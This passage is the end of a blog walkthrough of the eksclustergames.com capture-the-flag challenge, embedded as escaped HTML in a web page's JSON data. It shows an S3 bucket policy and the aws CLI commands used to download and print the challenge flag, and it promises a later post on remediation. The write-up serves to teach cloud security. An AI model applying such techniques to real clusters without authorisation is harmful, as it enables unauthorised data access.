class=\"hljs-punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003e\"Policy\"\u003c/span\u003e\u003cspan class=\"hljs-punctuation\"\u003e:\u003c/span\u003e \u003cspan class=\"hljs-punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"hljs-attr\"\u003e\"Statement\"\u003c/span\u003e\u003cspan class=\"hljs-punctuation\"\u003e:\u003c/span\u003e \u003cspan class=\"hljs-punctuation\"\u003e[\u003c/span\u003e\n            \u003cspan class=\"hljs-punctuation\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"hljs-attr\"\u003e\"Action\"\u003c/span\u003e\u003cspan class=\"hljs-punctuation\"\u003e:\u003c/span\u003e \u003cspan class=\"hljs-punctuation\"\u003e[\u003c/span\u003e\n                    \u003cspan class=\"hljs-string\"\u003e\"s3:GetObject\"\u003c/span\u003e\u003cspan class=\"hljs-punctuation\"\u003e,\u003c/span\u003e\n                    \u003cspan class=\"hljs-string\"\u003e\"s3:ListBucket\"\u003c/span\u003e\n                \u003cspan class=\"hljs-punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"hljs-punctuation\"\u003e,\u003c/span\u003e\n                \u003cspan class=\"hljs-attr\"\u003e\"Effect\"\u003c/span\u003e\u003cspan class=\"hljs-punctuation\"\u003e:\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"Allow\"\u003c/span\u003e\u003cspan class=\"hljs-punctuation\"\u003e,\u003c/span\u003e\n                \u003cspan class=\"hljs-attr\"\u003e\"Resource\"\u003c/span\u003e\u003cspan class=\"hljs-punctuation\"\u003e:\u003c/span\u003e \u003cspan class=\"hljs-punctuation\"\u003e[\u003c/span\u003e\n                    \u003cspan class=\"hljs-string\"\u003e\"arn:aws:s3:::challenge-flag-bucket-3ff1ae2\"\u003c/span\u003e\u003cspan class=\"hljs-punctuation\"\u003e,\u003c/span\u003e\n                    \u003cspan class=\"hljs-string\"\u003e\"arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag\"\u003c/span\u003e\n                \u003cspan class=\"hljs-punctuation\"\u003e]\u003c/span\u003e\n            \u003cspan class=\"hljs-punctuation\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"hljs-punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"hljs-punctuation\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"hljs-attr\"\u003e\"Version\"\u003c/span\u003e\u003cspan class=\"hljs-punctuation\"\u003e:\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"2012-10-17\"\u003c/span\u003e\n    \u003cspan class=\"hljs-punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"hljs-punctuation\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSo we want to fetch \u003ccode\u003earn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag\u003c/code\u003e:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag .\u003c/span\u003e\ndownload: s3://challenge-flag-bucket-3ff1ae2/flag to ./flag       \ncroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# cat flag\u003c/span\u003e\nwiz_eks_challenge{w0w_y0u_really_are_4n_eks_and_aws\u0026#x3C;*REDACTED*\u003e}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eand thats the final flag! In my next post I'll discuss the remediation steps\nto prevent this configuration mistakes on your cluster!\u003c/p\u003e","category":"Kubernetes","date":"2023-11-02T00:00:00Z","tags":["kubernetes","sre","security"],"title":"eksclustergames.com walk through!"}},"__N_SSG":true},"page":"/blog/[...id]","query":{"id":["2023","eks_cluster_games_ctf"]},"buildId":"R-uEYyZyL75EZxUttNLHg","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>